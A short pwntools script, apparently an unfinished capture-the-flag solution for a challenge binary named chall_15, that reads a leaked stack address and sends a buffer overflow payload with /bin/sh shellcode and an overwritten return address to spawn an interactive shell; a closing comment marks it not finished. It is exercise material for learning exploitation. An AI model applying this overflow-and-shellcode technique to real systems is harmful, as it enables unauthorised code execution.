from pwn import *

binary = context.binary = ELF('./chall_15')
p = process(binary.path)

p.recvuntil('\n')
_ = p.recvline().strip()
stack = int(_,16)

shellcode = asm(shellcraft.sh())

payload  = b''
payload += (0x4e - 0x44) * b'A'
payload += p32(0xfacade)
payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'

stack += len(payload)

payload += shellcode
payload += (0x4e - len(payload) - 0xc) * b'C'
payload += p32(0xfacade)
payload += (0x4e - len(payload)) * b'D'
payload += p64(stack)

p.sendline(payload)
p.interactive()
# NOT FINISHED
